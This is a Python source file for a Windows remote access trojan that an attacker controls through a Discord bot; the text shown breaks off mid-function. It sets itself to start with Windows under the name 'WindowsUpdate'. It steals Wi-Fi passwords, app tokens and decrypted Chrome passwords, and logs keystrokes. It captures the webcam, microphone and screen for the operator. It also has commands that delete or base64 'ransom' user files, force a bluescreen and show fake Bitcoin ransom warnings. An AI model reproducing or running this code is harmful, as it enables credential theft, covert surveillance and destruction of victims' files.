import os
import discord
from discord.ext import commands
import asyncio
import sys
import subprocess
import time
import pyautogui
import psutil
import pygetwindow as gw
from datetime import datetime
from typing import Optional
import random
import string
import ctypes
import threading
import pyttsx3
import platform
import uuid
import socket
import re
import requests
import winreg
import base64
import atexit
import win32clipboard
import cv2
import shutil
import glob
import json
import sqlite3
import win32crypt
from PIL import ImageGrab
import certifi
import ssl

# Fix SSL for PyInstaller bundled EXE
if getattr(sys, 'frozen', False):
    os.environ['SSL_CERT_FILE'] = certifi.where()
    os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
    ssl._create_default_https_context = ssl._create_unverified_context

# PyCryptodome - handle gracefully if missing
try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    AES = None

# PyAudio - optional, handle gracefully if missing
try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False
    pyaudio = None
    wave = None

if platform.system() != "Windows":
    sys.exit(0)

dir = os.path.dirname(os.path.abspath(__file__))
lock = os.path.join(dir, ".lock")
if os.path.exists(lock):
    sys.exit(0)
open(lock, "w").close()

running = True
keylog_active = False
keylog_file = os.environ['TEMP'] + "\\syslog.txt"
critical_mode = False
shake_active = False

def cleanup():
    global running
    running = False
    if os.path.exists(lock):
        os.remove(lock)
atexit.register(cleanup)

def keep_lock_alive():
    while running:
        if not os.path.exists(lock):
            open(lock, "w").close()
        time.sleep(0.1)
threading.Thread(target=keep_lock_alive, daemon=True).start()

class Config:
    TOKEN = "{placeholder_token}"
    WHITELISTED = [{placeholder_whitelist}]
    MAIN_CHANNEL = {placeholder_main_channel}
    PREFIX = "{placeholder_prefix}"
    STARTUP = {placeholder_add_to_startup}

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
bot.remove_command("help")

current_path = os.environ['SYSTEMDRIVE'] + "\\"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        return True
    except:
        return False

def get_displayname():
    try:
        GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
        NameDisplay = 3
        size = ctypes.pointer(ctypes.c_ulong(0))
        GetUserNameEx(NameDisplay, None, size)
        nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
        GetUserNameEx(NameDisplay, nameBuffer, size)
        return nameBuffer.value
    except:
        return platform.node()

def get_hwid():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        result = subprocess.check_output(cmd, shell=True).decode().strip()
        return result if result else str(uuid.getnode())
    except:
        return str(uuid.getnode())

def get_cpuinfo():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty Name"'
        cpu = subprocess.check_output(cmd, shell=True).decode().strip()
        return cpu if cpu else platform.processor() or "N/A"
    except:
        return platform.processor() or "N/A"

def get_gpuinfo():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name"'
        gpu = subprocess.check_output(cmd, shell=True).decode().strip()
        return gpu.split('\n')[0] if gpu else "N/A"
    except:
        return "N/A"

def get_raminfo():
    ram = psutil.virtual_memory()
    return f"{ram.total / (1024**3):.2f} GB"

def get_disks():
    disks = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks.append({'drive': partition.device, 'free': f"{usage.free / (1024**3):.2f}", 'total': f"{usage.total / (1024**3):.2f}", 'percent': usage.percent})
        except:
            pass
    return disks

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "N/A"

def get_ipinfo():
    try:
        response = requests.get('http://ip-api.com/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {'ip': data.get('query', 'N/A'), 'country': data.get('country', 'N/A'), 'region': data.get('regionName', 'N/A'), 'city': data.get('city', 'N/A'), 'isp': data.get('isp', 'N/A')}
    except:
        pass
    return {'ip': get_local_ip(), 'country': 'N/A', 'region': 'N/A', 'city': 'N/A', 'isp': 'N/A'}

def get_macaddress():
    try:
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    except:
        return "N/A"

def get_wifipasswords():
    profiles = []
    try:
        networks = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors='ignore')
        profile_names = re.findall(r'All User Profile\s*:\s*(.*)', networks)
        for name in profile_names:
            name = name.strip()
            try:
                info = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True).decode('utf-8', errors='ignore')
                password_match = re.search(r'Key Content\s*:\s*(.*)', info)
                profiles.append({'name': name, 'password': password_match.group(1).strip() if password_match else "N/A"})
            except:
                profiles.append({'name': name, 'password': "N/A"})
    except:
        pass
    return profiles

def grab_all_tokens():
    """Grab tokens from Discord, Telegram, Steam, and other apps"""
    tokens = []
    detected_apps = []
    
    # Discord tokens
    discord_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb"
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            detected_apps.append("Discord")
            try:
                for file in os.listdir(path):
                    if file.endswith((".log", ".ldb")):
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            data = f.read()
                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data)
                            for match in matches:
                                tokens.append(f"🟣 Discord Token: {match}")
                            matches = re.findall(r'mfa\.[\w-]{84}', data)
                            for match in matches:
                                tokens.append(f"🟣 Discord MFA: {match}")
            except:
                pass
    
    # Telegram tokens
    telegram_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy"
    ]
    for path in telegram_paths:
        if os.path.exists(path):
            detected_apps.append("Telegram")
            try:
                for file in os.listdir(path):
                    if file.endswith(".s"):
                        with open(os.path.join(path, file), 'rb') as f:
                            data = f.read()
                            matches = re.findall(rb'\d+:[a-zA-Z0-9_-]{35}', data)
                            for match in matches:
                                tokens.append(f"🔵 Telegram: {match.decode('utf-8', errors='ignore')}")
            except:
                pass
    
    # Steam
    steam_path = os.path.expanduser("~") + r"\AppData\Local\Steam\config\loginusers.vdf"
    if os.path.exists(steam_path):
        detected_apps.append("Steam")
        try:
            with open(steam_path, 'r', errors='ignore') as f:
                data = f.read()
                matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
                for match in matches:
                    tokens.append(f"🎮 Steam Account: {match}")
        except:
            pass
    
    # Chrome cookies (OAuth tokens)
    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default"
    if os.path.exists(chrome_path):
        detected_apps.append("Chrome")
        try:
            cookies_db = os.path.join(chrome_path, "Cookies")
            if os.path.exists(cookies_db):
                temp_db = os.environ['TEMP'] + "\\cookies.db"
                shutil.copy2(cookies_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name FROM cookies WHERE name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%'")
                for host, name in cursor.fetchall():
                    tokens.append(f"🍪 Cookie: {host} - {name}")
                conn.close()
                os.remove(temp_db)
        except:
            pass
    
    # Epic Games
    epic_path = os.path.expanduser("~") + r"\AppData\Local\Epic Games\Launcher\Saved\Config\Windows\GameUserSettings.ini"
    if os.path.exists(epic_path):
        detected_apps.append("Epic Games")
        try:
            with open(epic_path, 'r', errors='ignore') as f:
                data = f.read()
                matches = re.findall(r'[a-f0-9]{32}', data)
                for match in matches:
                    tokens.append(f"🎯 Epic Games: {match}")
        except:
            pass
    
    # Minecraft
    mc_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_profiles.json",
        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\usercache.json"
    ]
    for path in mc_paths:
        if os.path.exists(path):
            detected_apps.append("Minecraft")
            try:
                with open(path, 'r', errors='ignore') as f:
                    data = f.read()
                    matches = re.findall(r'"accessToken":"([^"]+)"', data)
                    for match in matches:
                        tokens.append(f"⛏️ Minecraft: {match[:20]}...")
            except:
                pass
    
    # Spotify
    spotify_path = os.path.expanduser("~") + r"\AppData\Roaming\Spotify\Users"
    if os.path.exists(spotify_path):
        detected_apps.append("Spotify")
        try:
            for file in os.listdir(spotify_path):
                if file.endswith(".json"):
                    with open(os.path.join(spotify_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"accessToken":"([^"]+)"', data)
                        for match in matches:
                            tokens.append(f"🎵 Spotify: {match[:30]}...")
        except:
            pass
    
    # GitHub (Windows Credential Manager)
    try:
        import win32cred
        creds = win32cred.CredEnumerate(None, 0)
        for cred in creds:
            if 'github' in cred['TargetName'].lower() or 'token' in cred['TargetName'].lower():
                detected_apps.append("GitHub")
                tokens.append(f"🐙 GitHub: {cred['TargetName']}")
                break
    except:
        pass
    
    # Riot Games
    riot_path = os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data"
    if os.path.exists(riot_path):
        detected_apps.append("Riot Games")
        try:
            for root, dirs, files in os.walk(riot_path):
                for file in files:
                    if file.endswith(".json"):
                        with open(os.path.join(root, file), 'r', errors='ignore') as f:
                            data = f.read()
                            matches = re.findall(r'"[a-zA-Z0-9_-]{30,}"', data)
                            for match in matches:
                                if len(match) > 30:
                                    tokens.append(f"🏹 Riot Games: {match[:30]}...")
        except:
            pass
    
    return tokens, list(set(detected_apps))

def get_chrome_passwords():
    if not CRYPTO_AVAILABLE:
        return ["pycryptodome not installed"]
    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data"
    local_state_path = os.path.join(chrome_path, "Local State")
    if not os.path.exists(local_state_path):
        return ["Chrome not found"]
    with open(local_state_path, 'r') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    passwords = []
    for profile in ["Default"] + [f"Profile {i}" for i in range(1, 10)]:
        login_db = os.path.join(chrome_path, profile, "Login Data")
        if not os.path.exists(login_db):
            continue
        temp_db = os.environ['TEMP'] + "\\chrome_login.db"
        shutil.copy2(login_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, encrypted_pass in cursor.fetchall():
            if encrypted_pass:
                try:
                    iv = encrypted_pass[3:15]
                    payload = encrypted_pass[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted = cipher.decrypt(payload)[:-16].decode()
                    passwords.append(f"{url}\nUser: {username}\nPass: {decrypted}\n{'-'*40}")
                except:
                    pass
        conn.close()
        os.remove(temp_db)
    return passwords if passwords else ["No passwords found"]

def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo))
    millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    seconds = millis // 1000
    return f"{seconds//3600}h {(seconds%3600)//60}m {seconds%60}s"

def capture_webcam(cam_id=0):
    cap = cv2.VideoCapture(cam_id)
    if not cap.isOpened():
        return None
    ret, frame = cap.read()
    if ret:
        path = os.environ['TEMP'] + "\\webcam.jpg"
        cv2.imwrite(path, frame)
        cap.release()
        return path
    cap.release()
    return None

def record_mic(duration=10):
    if not AUDIO_AVAILABLE:
        return None
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * duration))]
    stream.stop_stream()
    stream.close()
    p.terminate()
    path = os.environ['TEMP'] + "\\mic.wav"
    wf = wave.open(path, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return path

def speak(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

def show_message_box(text):
    ctypes.windll.user32.MessageBoxW(0, text, "System Message", 0)

def set_wallpaper(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

def block_input(block):
    ctypes.windll.user32.BlockInput(block)

def make_critical():
    global critical_mode
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        critical_mode = True
        return True
    except:
        return False

def bluescreen():
    if not is_admin():
        return False
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    return True

def hide_process():
    if is_admin():
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        return True
    return False

def start_keylog():
    global keylog_active
    keylog_active = True
    from pynput import keyboard
    def on_press(key):
        if not keylog_active:
            return False
        with open(keylog_file, 'a', encoding='utf-8') as f:
            try:
                if hasattr(key, 'char') and key.char:
                    f.write(key.char)
                elif key == key.space:
                    f.write(' ')
                elif key == key.enter:
                    f.write('\n')
                else:
                    f.write(f'[{str(key).replace("Key.", "").upper()}]')
            except:
                pass
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

def start_shake(duration_seconds=10):
    global shake_active
    if shake_active:
        return False
    shake_active = True
    def shake_loop():
        global shake_active
        start_time = time.time()
        while shake_active and (time.time() - start_time) < duration_seconds:
            x, y = pyautogui.position()
            for dx, dy in [(0, 10), (10, 0), (0, -10), (-10, 0)]:
                if not shake_active:
                    break
                pyautogui.moveTo(x + dx, y + dy, duration=0.01)
                time.sleep(0.01)
            time.sleep(0.02)
        shake_active = False
    thread = threading.Thread(target=shake_loop, daemon=True)
    thread.start()
    return True

def stop_shake():
    global shake_active
    shake_active = False
    return True

def get_recent_downloads():
    downloads = []
    try:
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        if os.path.exists(downloads_path):
            files = os.listdir(downloads_path)
            for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_path, x)), reverse=True)[:30]:
                path = os.path.join(downloads_path, f)
                if os.path.isfile(path):
                    size = os.path.getsize(path)
                    size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
                    mtime = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
                    downloads.append(f"📄 {f}\n   Size: {size_str} | Modified: {mtime}\n")
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
            downloads_reg = winreg.QueryValueEx(key, "{374DE290-123F-4565-9164-39C4925E467B}")[0]
            if downloads_reg and os.path.exists(downloads_reg) and downloads_reg != downloads_path:
                files = os.listdir(downloads_reg)
                for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_reg, x)), reverse=True)[:20]:
                    path = os.path.join(downloads_reg, f)
                    if os.path.isfile(path):
                        size = os.path.getsize(path)
                        size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
                        downloads.append(f"📄 {f}\n   Size: {size_str}\n")
        except:
            pass
        return downloads if downloads else ["No recent downloads found"]
    except:
        return ["Error getting downloads"]

def get_installed_programs():
    programs = []
    try:
        key_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        for key_path in key_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if name:
                                try:
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                    programs.append(f"{name} (v{version})")
                                except:
                                    programs.append(name)
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        pass
                winreg.CloseKey(key)
            except:
                pass
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        if name:
                            programs.append(f"👤 {name}")
                    except:
                        pass
                    winreg.CloseKey(subkey)
                except:
                    pass
            winreg.CloseKey(key)
        except:
            pass
        return list(set(programs)) if programs else ["No programs found"]
    except:
        return ["Error getting installed programs"]

def is_authorized():
    async def auth(ctx):
        if ctx.author.id in Config.WHITELISTED:
            return True
        embed = discord.Embed(title="Access Denied", color=discord.Color.red())
        await ctx.send(embed=embed)
        return False
    return commands.check(auth)

async def send_embed(ctx, title, description, color=discord.Color.blue()):
    embed = discord.Embed(title=title, description=description, color=color)
    await ctx.send(embed=embed)

# ========== ALL COMMANDS ==========

@bot.event
async def on_ready():
    await bot.get_channel(Config.MAIN_CHANNEL).send(f"<@{Config.WHITELISTED[0]}>")
    embed = discord.Embed(title="RAT Online", description=f"Prefix: `{Config.PREFIX}`\nUser: `{get_displayname()}`\nAdmin: {is_admin()}", color=discord.Color.green())
    await bot.get_channel(Config.MAIN_CHANNEL).send(embed=embed)

@bot.command(name='info')
@is_authorized()
async def system_info(ctx):
    try:
        await send_embed(ctx, "Collecting Info", "Please wait...", discord.Color.blue())
        display_name = get_displayname()
        hwid = get_hwid()
        cpu_info = get_cpuinfo()
        gpu_info = get_gpuinfo()
        ram_info = get_raminfo()
        disks = get_disks()
        ip_info = get_ipinfo()
        mac_address = get_macaddress()
        wifi_profiles = get_wifipasswords()
        embed = discord.Embed(title="System Information", color=discord.Color.blue())
        embed.add_field(name="Display Name", value=f"```{display_name}```", inline=False)
        embed.add_field(name="HWID", value=f"```{hwid}```", inline=False)
        embed.add_field(name="CPU", value=f"```{cpu_info}```", inline=False)
        embed.add_field(name="GPU", value=f"```{gpu_info}```", inline=False)
        memory = psutil.virtual_memory()
        embed.add_field(name="RAM", value=f"```{ram_info} ({memory.percent}% used)```", inline=False)
        embed.add_field(name="CPU Usage", value=f"```{psutil.cpu_percent(interval=1)}%```", inline=True)
        disk_str = "\n".join([f"{d['drive']}: {d['free']}GB free / {d['total']}GB" for d in disks[:3]])
        embed.add_field(name="Disks", value=f"```{disk_str}```", inline=False)
        embed.add_field(name="Public IP", value=f"```{ip_info['ip']}```", inline=False)
        embed.add_field(name="Location", value=f"```{ip_info['city']}, {ip_info['region']}, {ip_info['country']}```", inline=False)
        embed.add_field(name="MAC", value=f"```{mac_address}```", inline=False)
        embed.add_field(name="Local IP", value=f"```{get_local_ip()}```", inline=True)
        embed.add_field(name="OS", value=f"```{platform.system()} {platform.release()}```", inline=True)
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        embed.add_field(name="Boot Time", value=f"```{boot_time.strftime('%Y-%m-%d %H:%M:%S')}```", inline=True)
        if wifi_profiles:
            wifi_str = "\n".join([f"{w['name']}: {w['password']}" for w in wifi_profiles[:5]])
            embed.add_field(name="WiFi", value=f"```{wifi_str}```", inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='lock')
@is_authorized()
async def lock_pc(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await send_embed(ctx, "Locked", "Workstation locked", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='crash')
@is_authorized()
async def blue_screen(ctx):
    try:
        bluescreen()
        await send_embed(ctx, "BSOD", "Triggered", discord.Color.dark_red())
    except:
        await send_embed(ctx, "BSOD Failed", "Admin required", discord.Color.red())

@bot.command(name='rickroll')
@is_authorized()
async def rick_roll(ctx):
    try:
        subprocess.Popen('start https://www.youtube.com/watch?v=dQw4w9WgXcQ', shell=True)
        await send_embed(ctx, "Rickroll", "Never gonna give you up", discord.Color.gold())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='filescramble')
@is_authorized()
async def file_scramble(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        scrambled = 0
        await send_embed(ctx, "Scrambling", "Renaming files...", discord.Color.purple())
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            old = os.path.join(root, file)
                            ext = os.path.splitext(file)[1]
                            new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ext
                            os.rename(old, os.path.join(root, new_name))
                            scrambled += 1
                        except:
                            pass
        await send_embed(ctx, "Complete", f"Scrambled {scrambled} files", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='filedestroy')
@is_authorized()
async def file_destroy(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        deleted = 0
        await send_embed(ctx, "Destroying", "Deleting files...", discord.Color.dark_red())
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            os.remove(os.path.join(root, file))
                            deleted += 1
                        except:
                            pass
        await send_embed(ctx, "Complete", f"Deleted {deleted} files", discord.Color.dark_red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='fileransom')
@is_authorized()
async def file_ransom(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        encrypted = 0
        await send_embed(ctx, "Encrypting", "Ransomware in progress...", discord.Color.dark_purple())
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            path = os.path.join(root, file)
                            with open(path, 'rb') as f:
                                data = base64.b64encode(f.read())
                            with open(path + '.ENCRYPTED', 'wb') as f:
                                f.write(data)
                            os.remove(path)
                            encrypted += 1
                        except:
                            pass
        await send_embed(ctx, "Complete", f"Encrypted {encrypted} files", discord.Color.dark_purple())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='virus')
@is_authorized()
async def virus_message(ctx):
    try:
        msg = "WARNING! Virus detected. Pay $5000 in Bitcoin or all files will be deleted."
        for _ in range(10):
            subprocess.run(f'powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'{msg}\')"', shell=True)
        await send_embed(ctx, "Virus Alert", "Displayed fake warnings", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='voice')
@is_authorized()
async def voice_message(ctx, *, message: str):
    try:
        speak(message)
        await send_embed(ctx, "Voice", f"Spoke: {message}", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='msgbox')
@is_authorized()
async def msg_box(ctx, *, message: str):
    try:
        show_message_box(message)
        await send_embed(ctx, "Message Box", f"Shown: {message}", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='screenshot')
@is_authorized()
async def take_screenshot(ctx, name: Optional[str] = None):
    try:
        filename = name or f"screenshot_{int(time.time())}.png"
        pyautogui.screenshot().save(filename)
        with open(filename, 'rb') as f:
            await ctx.send(file=discord.File(f))
        os.remove(filename)
        await send_embed(ctx, "Screenshot", "Captured", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='open')
@is_authorized()
async def open_application(ctx, *, app_name: str):
    try:
        apps = {'notepad': 'notepad.exe', 'calc': 'calc.exe', 'chrome': 'chrome.exe', 'cmd': 'cmd.exe'}
        subprocess.Popen(apps.get(app_name.lower(), app_name), shell=True)
        await send_embed(ctx, "Opened", app_name, discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='close')
@is_authorized()
async def close_application(ctx, *, app_name: str):
    try:
        for proc in psutil.process_iter(['name']):
            if app_name.lower() in proc.info['name'].lower():
                proc.terminate()
                await send_embed(ctx, "Closed", app_name, discord.Color.green())
                return
        await send_embed(ctx, "Not Found", app_name, discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='listapps')
@is_authorized()
async def list_applications(ctx, limit: int = 15):
    try:
        windows = [w for w in gw.getAllTitles() if w]
        embed = discord.Embed(title="Running Apps", description=f"Showing {min(limit, len(windows))} of {len(windows)}", color=discord.Color.green())
        for i, w in enumerate(windows[:limit]):
            embed.add_field(name=f"{i+1}", value=w[:50], inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='click')
@is_authorized()
async def mouse_click(ctx, button: str = 'left'):
    try:
        b = button.lower()
        if b == 'left':
            pyautogui.click()
        elif b == 'right':
            pyautogui.rightClick()
        elif b == 'middle':
            pyautogui.middleClick()
        else:
            await send_embed(ctx, "Invalid", "Use left/right/middle", discord.Color.orange())
            return
        await send_embed(ctx, "Clicked", button, discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='press')
@is_authorized()
async def press_key(ctx, *, key_combo: str):
    try:
        pyautogui.hotkey(*key_combo.split('+'))
        await send_embed(ctx, "Keys Pressed", key_combo, discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='shutdown')
@is_authorized()
async def shutdown_pc(ctx, delay: int = 30):
    try:
        if delay < 10:
            await send_embed(ctx, "Error", "Delay must be >=10", discord.Color.red())
            return
        await send_embed(ctx, "Shutdown", f"In {delay} seconds", discord.Color.red())
        await asyncio.sleep(delay)
        os.system('shutdown /s /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='restart')
@is_authorized()
async def restart_pc(ctx, delay: int = 30):
    try:
        if delay < 10:
            await send_embed(ctx, "Error", "Delay must be >=10", discord.Color.red())
            return
        await send_embed(ctx, "Restart", f"In {delay} seconds", discord.Color.orange())
        await asyncio.sleep(delay)
        os.system('shutdown /r /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='playpause')
@is_authorized()
async def media_play_pause(ctx):
    try:
        pyautogui.press('playpause')
        await send_embed(ctx, "Media", "Play/Pause toggled", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='nexttrack')
@is_authorized()
async def media_next(ctx):
    try:
        pyautogui.press('nexttrack')
        await send_embed(ctx, "Media", "Next track", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='listfiles')
@is_authorized()
async def list_files(ctx, directory: str = "."):
    try:
        if directory.startswith("~"):
            directory = os.path.expanduser(directory)
        if directory == ".":
            directory = current_path
        if not os.path.exists(directory):
            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
            return
        if not os.path.isdir(directory):
            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
            return
        files = os.listdir(directory)
        items = []
        for f in files:
            path = os.path.join(directory, f)
            if os.path.isdir(path):
                items.append({'name': f, 'type': 'folder', 'path': path})
            else:
                size = os.path.getsize(path)
                ext = os.path.splitext(f)[1].lower() if os.path.splitext(f)[1] else ""
                items.append({'name': f, 'type': ext, 'size': size, 'path': path})
        items.sort(key=lambda x: (0 if x['type'] == 'folder' else 1, x['name'].lower()))
        chunks = []
        current_chunk = []
        for item in items:
            if item['type'] == 'folder':
                line = f"📁 {item['name']}/"
            else:
                size = item['size']
                if size < 1024:
                    size_str = f"{size} B"
                elif size < 1048576:
                    size_str = f"{size/1024:.1f} KB"
                elif size < 1073741824:
                    size_str = f"{size/1048576:.1f} MB"
                else:
                    size_str = f"{size/1073741824:.2f} GB"
                ext = item['type'][1:] if item['type'] else "noext"
                ext_emoji = {
                    'txt': '📄', 'py': '🐍', 'exe': '⚙️', 'dll': '🔧',
